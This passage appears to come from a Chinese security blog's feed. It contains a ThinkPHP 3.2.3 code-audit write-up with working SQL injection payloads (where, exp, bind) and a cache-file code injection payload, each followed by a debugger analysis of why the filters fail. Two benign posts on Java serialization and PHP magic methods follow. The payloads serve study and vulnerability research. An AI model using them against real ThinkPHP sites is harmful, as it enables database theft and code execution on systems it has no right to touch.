class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">获取数据表中的一行数据<br></code></pre></td></tr></table></figure><p><strong>安全过滤机制</strong></p><blockquote><p>ThinkPHP 3 的 I 方法和数据库操作时都会提供一个自动安全过滤的操作</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;DEFAULT_FILTER&#x27;</span>        =&gt;  <span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>, <span class="hljs-regexp">//</span> 默认参数过滤方法 用于I函数...<br></code></pre></td></tr></table></figure><p>但是 ThinkPHP3.2.3 中敏感字符不包含 BIND，因此这里就存在一个 SQL 注入的风险</p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="where-注入"><a href="#where-注入" class="headerlink" title="where 注入"></a>where 注入</h5><p>环境配置</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153619171.png" alt="image-20210926153619171"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926151434094.png" alt="·"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153052777.png" alt="image-20210926153052777"></p><p><strong>where注入</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?id[where]=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(0x7e,(select passwd <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit 1),0x7e),1)%23<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153659388.png" alt="image-20210926153659388"></p><p>成功产生报错注入</p><p><strong>原理分析</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928194920426.png" alt="image-20210928194920426"></p><p>首先传入 <code>id=1&#39;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928160906064.png" alt="image-20210928160906064"></p><p><code>I()</code> 方法获取参数，并且使用默认的 <code>htmlspecialchars()</code> 过滤参数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928161423771.png" alt="image-20210928161423771"></p><p><code>htmlspecialchars()</code> 将特殊的字符转换为 HTML 实体</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928161715938.png" alt="image-20210928161715938"><br><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928183704166.png" alt="image-20210928183704166"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926155823448.png" alt="image-20210926155823448"></p><p><code>is_array()</code> 判断数据是不是数组，<code>array_walk_recursive()</code> 对数组的所有元素递归的应用用户函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928164612358.png" alt="image-20210928164612358"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926164810199.png" alt="image-20210926164810199"></p><blockquote><p>上面这个函数，如果发现恶意字符就会在末尾加上一个空格 ，加空格有什么用呢？？？</p><p>并且这里只匹配了以这些东西开头的情况，这个过滤写得不严谨，感觉相当于没有写</p></blockquote><p>第一行的 <code>I()</code> 方法主要提取参数，并且利用函数过滤参数的危险字符，之后转向 <code>M()</code> 方法实例化 <code>User</code>，之后又运行 <code>find()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928172646948.png" alt="image-20210928172646948"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928173329266.png" alt="image-20210928173329266"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($options[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; is_array($options[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>($fields) &amp;&amp; !<span class="hljs-keyword">isset</span>($options[<span class="hljs-string">&#x27;join&#x27;</span>]))<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928191804739.png" alt="image-20210928191804739"></p><p>这里由于 <code>$options[&#39;where&#39;] </code>是数组所以，就会加入<code>_parseType()</code>就行强制类型转换</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928173405525.png" alt="image-20210928173405525"></p><p>一下是传入 <code>id=1&#39;</code> 时，<code>id</code> 会被强制转换为 1，然后返回到查询语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928182233997.png" alt="image-20210928182233997"></p><p>所以最后的结果是正常的返回</p><p>使用 payload 测试</p> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?id[where]=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(0x7e,(select passwd <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit 1),0x7e),1)%23<br></code></pre></td></tr></table></figure><p>这里逃过了 <code>think_filter()</code> 的过滤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928183338455.png" alt="image-20210928183338455"></p><p>这里 payload 直接绕过了过滤函数的检查，在进入 <code>find()</code>  后，又跳过了 <code>_paraseType()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928191259855.png" alt="image-20210928191259855"></p><blockquote><p>由于 $options[‘where’] 不是数组，所以这里就直接跳过了 <code>_parseType()</code> 的强制类型转换</p></blockquote><p>如果<code>payload</code> 直接传入 <code>id</code> 而不是 <code>id[where]</code> 这样就会被进入下面的<code>_parseType()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928192035202.png" alt="image-20210928192035202"></p><p>这样绕过了所有的过滤拼接到了 <code>where</code> 上面，造成了报错注入</p><h5 id="EXP注入"><a href="#EXP注入" class="headerlink" title="EXP注入"></a>EXP注入</h5><p>修改入口</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload:<br>?username[<span class="hljs-number">0</span>]=exp&amp;username[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928193731317.png" alt="image-20210928193731317"></p><p><strong>漏洞分析</strong></p><p><code>D()</code>方法快速实例化对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928200500948.png" alt="image-20210928200500948"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928193959972.png" alt="image-20210928193959972"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">in_array() 检测数组中是否存在某个值<br>第一个参数是待搜索的值（区分大小写） 第二个参数是待搜索的数组<br><br>is_scalar() 检查待检测变量是否为标量<br>标量变量是指 int、float、string 或 bool 类型的变量。 array、object 和<span class="hljs-built_in"> resource </span>类型不是标量<br></code></pre></td></tr></table></figure><p>下断点接着调，其他的函数操作没有什么影响</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928210028057.png" alt="image-20210928210028057">重点在下面这里</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928205333203.png" alt="image-20210928205333203"></p><blockquote><p>为什么不用 <code>I()</code> 接受参数，因为使用了 <code>I()</code> 接受参数的话这里的 $exp 就会变成 <code>exp空格</code> 就不能跳入之后的判断 </p><p>这里直接使用 bind 的话，sql 语句会拼接错误，所以 bind 的注入需要使用其他技巧</p></blockquote><h5 id="bind-注入"><a href="#bind-注入" class="headerlink" title="bind 注入"></a>bind 注入</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload<br>?id[<span class="hljs-number">0</span>]=bind&amp;id[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)&amp;passwd=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928210254401.png" alt="image-20210928210254401"></p><blockquote><p><code>save()</code> 方法的返回值是<strong>影响的记录数</strong>，如果返回false则表示更新出错，因此一定要用恒等来判断是否更新失败</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">$User = M(<span class="hljs-string">&quot;Users&quot;</span>); <span class="hljs-comment">// 实例化user</span><br>$user[<span class="hljs-string">&#x27;id&#x27;</span>] = I(<span class="hljs-string">&#x27;id&#x27;</span>);  <span class="hljs-comment">// 获取 id 并且进行简单的过滤</span><br>$data[<span class="hljs-string">&#x27;password&#x27;</span>] = I(<span class="hljs-string">&#x27;passwd&#x27;</span>); <span class="hljs-comment">// 获取 passwd 并且进行简单的过滤</span><br>$valu = $User-&gt;where($user)-&gt;save($data); <span class="hljs-comment">// 查询结果</span><br>var_dump($valu);<br></code></pre></td></tr></table></figure><p>这里直接从<code>$valu = $User-&gt;where($user)-&gt;save($data);</code> 看起</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928213331107.png" alt="image-20210928213331107"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928213731615.png" alt="image-20210928213731615"></p><blockquote><p>这里会直接跳出 <code>_parseType()</code> 所以这个函数对参数无影响</p></blockquote><p>最后的参数拼接</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928214024437.png" alt="image-20210928214024437"></p><p>最后拼接成的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928214254837.png" alt="image-20210928214254837"></p><p>why id[1] 要选择 0 ？</p><p>看到上面的结果，可以发现 SQL 语句格式还是不对的，所以还是继续往下走</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215309034.png" alt="image-20210928215309034"></p><p><code>strstr()</code> 返回字符串从字符串第一次出现的位置开始返回剩下的字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215537303.png" alt="image-20210928215537303"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928215831483.png" alt="image-20210928215831483"></p><blockquote><p>array_map() 将用户自定义函数作用到每个值上，并返回用户自定义函数作用后的带有新的值的数组</p><p>其中<code>function($val) use($that)&#123; return &#39;\&#39;&#39;.$that-&gt;escapeString($val).&#39;\&#39;&#39;; &#125;,$this-&gt;bind</code> 是匿名函数，用来检测 bin d 是否含有危险字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$val</span>) <span class="hljs-title">use</span>(<span class="hljs-params">$that</span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>.$that-&gt;escapeString($val).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;&#125;,<span class="hljs-keyword">$this</span>-&gt;bind<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928220537895.png" alt="image-20210928220537895"></p><blockquote><p><code>addslashes($str)</code>函数返回在预定义字符之前添加反斜杠的字符串</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001170311345.png" alt="image-20211001170311345"></p><p>经过 <code>strstr()</code> 的处理就变成了正常的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928220040512.png" alt="image-20210928220040512"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001190445131.png" alt="image-20211001190445131"></p><blockquote><p>在本地把替换的语句分解了一遍，发现就是将字符串中存在的数组的键用值替换了，最终构造出正常的语句</p></blockquote><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">payload<br>?name=%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aphpinfo();%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001193410813.png" alt="image-20211001193410813"></p><p>缓存文件名就是 <code>mad5(name)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001193431779.png" alt="image-20211001193431779"></p><p><strong>漏洞分析</strong></p><p>获取缓存，<code>set()</code> 方法是写入缓存数据到文件的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001202025396.png" alt="image-20211001202025396"></p><p>文件名的确定</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001203247528.png" alt="image-20211001203247528"></p><p>最终使用 <code>file_put_contents()</code> 写入文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211001204822794.png" alt="image-20211001204822794"></p><p>参考文章：</p><p><a href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p><p><a href="https://www.kancloud.cn/manual/thinkphp/1678">https://www.kancloud.cn/manual/thinkphp/1678</a></p><p><a href="https://www.freebuf.com/vuls/282906.html">https://www.freebuf.com/vuls/282906.html</a></p><p><a href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-3&quot;&gt;&lt;a href=&quot;#ThinkPHP-3&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 3&quot;&gt;&lt;/a&gt;ThinkPHP 3&lt;/h1&gt;&lt;h2 id=&quot;框架学习&quot;&gt;&lt;a href=&quot;#框架学习&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化基础</title>
    <link href="http://example.com/2021/10/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/10/23/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</id>
    <published>2021-10-22T16:34:36.000Z</published>
    <updated>2021-11-10T00:51:08.016Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化基础"><a href="#Java-反序列化基础" class="headerlink" title="Java 反序列化基础"></a>Java 反序列化基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化的过程就是把字节流还原成对象。Java 中的<code>ObjectOutputStream</code>类得 <code>writeObject()</code> 方法可以实现序列化，<code>ObjectInputStream</code>类得<code>readObject()</code>方法用于反序列化。</p><p>Java 序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成 Java 对象而被非常频繁的被用于 <code>Socket</code> 传输。 在 <code>RMI(Java远程方法调用-Java Remote Method Invocation)</code> 和 <code>JMX(Java管理扩展-Java Management Extensions)</code> 服务中对象反序列化机制被强制性使用。在 HTTP 请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</p><h2 id="Java-序列化-反序列化"><a href="#Java-序列化-反序列化" class="headerlink" title="Java 序列化 / 反序列化"></a>Java 序列化 / 反序列化</h2><p>Java 中要实现对象序列化需要实现 <code>java.io.Serializable(内部序列化)</code> 或 <code>java.io.Externalizable(外部序列化)</code> 接口即可被序列化，其中<code>java.io.Externalizable</code>接口实现了<code>java.io.Serializable</code>接口</p><p>反序列化类对象有如下限制：</p><ol><li>被反序列化的类必须存在</li><li><code>serialVersionUID</code>值必须一致</li></ol><blockquote><p>反序列化类对象是不会调用该类构造方法的</p></blockquote><p>对象序列化保存的是对象的“状态”，即它的成员变量，对象序列化不会关注类中的静态变量。除了在持久化对象时会用到对象序列化之外，使用 RMI 或者在网络传递对象时都会用到对象序列化。</p><h2 id="序列化与反序列化相关知识"><a href="#序列化与反序列化相关知识" class="headerlink" title="序列化与反序列化相关知识"></a>序列化与反序列化相关知识</h2><ol><li>只要实现了 <code>java.io.Serializable</code>接口就可以被序列化</li><li>通过 <code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code> 对对象进行序列化与反序列化</li><li>虚拟机是否允许反序列化，不仅取决于类路径和功能是否一致，也与两个类的序列化 ID （<code>private static final long serialVersionUID</code>）是否一致有关</li><li>序列化不保存静态变量</li><li>想要将父类对象也序列化需要让父类也实现序列化接口</li><li><code>Transient</code> 关键字的作用时控制变量的序列化，在变量前加上它可以阻止该变量被序列化到文件中，在被序列化后，<code>Transient</code> 变量的值被设定为初始值，如 int 型是 0，对象型是 null</li><li>服务端给客户端发送序列化对象数据，对象中有一些数据是敏感的，比如密码字符串等，希望对该密码字段在序列化时进行加密，而客户端如果拥有解密的密钥，只有在客户端进行反序列化时才可以对密码进行读取，这样可以在一定程度上保证对象的数据安全</li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 测试类</span><br><span class="hljs-keyword">package</span> com;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-comment">// 类想要被序列化，必须实现 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">People</span><span class="hljs-params">()</span></span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;无参构造！！&quot;</span>);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">People</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> age)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.name = name;<br>            <span class="hljs-keyword">this</span>.age = age;<br>            System.out.println(<span class="hljs-string">&quot;有参构造！！！&quot;</span>);<br>        &#125;<br>    <span class="hljs-comment">// 重写 toString 方法</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span><span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        People people = <span class="hljs-keyword">new</span> People(<span class="hljs-string">&quot;lcdm124&quot;</span>,<span class="hljs-number">12</span>);<br>        <span class="hljs-comment">// 序列化</span><br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;E:/test.ser&quot;</span>));<br>        objectOutputStream.writeObject(people);<br>        objectOutputStream.close();<br>        System.out.println(<span class="hljs-string">&quot;----------&quot;</span>);<br>        <span class="hljs-comment">// 反序列化</span><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;E:/test.ser&quot;</span>));<br>        People p = (People) objectInputStream.readObject();<br>        System.out.println(p);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211018164134629.png" alt="image-20211018164134629"></p><p>序列化文件中的内容</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20211018164213927.png" alt="image-20211018164213927"></p><p>其中 <code>ac ed 00 05</code> 是 Java 序列化的特征码</p><p><code>Transient</code> 关键字的作用时控制变量的序列化，在变量前加上它可以阻止该变量被序列化到文件中，在被序列化后，<code>Transient</code> 变量的值被设定为初始值，如 int 型是 0，对象型是 null</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211022235624330.png" alt="image-20211022235624330"></p><p>同一类序列化与反序列化前后的 <code>serialVersionUID</code> 需要一样，不然就会反序列化异常</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023000028586.png" alt="image-20211023000028586"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023000051090.png" alt="image-20211023000051090"></p><h2 id="理解-writeObject-和-readObject"><a href="#理解-writeObject-和-readObject" class="headerlink" title="理解 writeObject() 和 readObject()"></a>理解 writeObject() 和 readObject()</h2><p>在序列化和反序列化的过程中，如果被序列化的类定义了 <code>writeObject()</code> 和 <code>readObject()</code> 方法，虚拟机会试图调用对象类里面的方法，进行用户自定义的序列化和反序列化，如果没有这有的方法则默认调用 <code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code> 的默认方法</p><h2 id="Base64方法打印序列化字符串"><a href="#Base64方法打印序列化字符串" class="headerlink" title="Base64方法打印序列化字符串"></a>Base64方法打印序列化字符串</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107185316661.png" alt="image-20211107185316661"></p><p>参考文章</p><p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p><p><a href="https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/">https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/</a></p><p><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><p><a href="https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://y4er.com/post/java-deserialization-1/">https://y4er.com/post/java-deserialization-1/</a></p><p><a href="https://www.hollischuang.com/archives/1140">https://www.hollischuang.com/archives/1140</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-反序列化基础&quot;&gt;&lt;a href=&quot;#Java-反序列化基础&quot; class=&quot;headerlink&quot; title=&quot;Java 反序列化基础&quot;&gt;&lt;/a&gt;Java 反序列化基础&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>PHP序列化魔法函数</title>
    <link href="http://example.com/2021/10/21/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2021/10/21/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-21T15:29:59.000Z</published>
    <updated>2021-10-23T15:11:20.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP序列化复习"><a href="#PHP序列化复习" class="headerlink" title="PHP序列化复习"></a>PHP序列化复习</h1><p>之前学的不是那么牢靠，所以这里来复习一下</p><h2 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">__construct()   <span class="hljs-regexp">//</span>类一执行就开始调用，其作用是拿来初始化一些值<br>__destruct() <span class="hljs-regexp">//</span>对象被销毁时触发<br>__sleep()   <span class="hljs-regexp">//</span>使用serialize时触发<br>__wakeup()    <span class="hljs-regexp">//</span>使用unserialize时触发<br>__set() <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__get() <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__call() <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__toString() <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__invoke() <span class="hljs-regexp">//</span>当脚本尝试将对象调用为函数时触发<br>__isset() <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset() <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br><br>__callStatic()  <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>构造函数，在创建类时自动调用，常用于初始化参数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224108586.png" alt="image-20211020224108586"></p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>析构函数，在类被销毁得时候调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224324684.png" alt="image-20211020224324684"></p><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>它不能返回父类私有成员的名字，可以用 Serializable 接口来替代。<code>__sleep()</code>方法常用于提交未提交的数据，或类似的清理操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224546140.png" alt="image-20211020224546140"></p><blockquote><p>如果函数存在，序列化就会出现一些问题</p></blockquote><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>在反序列化时调用</p><p><img src="D:\markdown\image-20211020231909276.png" alt="image-20211020231909276"></p><p>这里反序列化时，类会自动调用 <code>__wakeup</code> 最后会销毁，这里不会调用到构造函数</p><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p>这个方法用来为私有成员属性设置值，有两个参数，第一个参数为你要是指值得属性名，第二个参数就是需要设置得值。</p><blockquote><p>通俗理解就是利用这个方法使我们可以在类外给私有变量重新赋值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 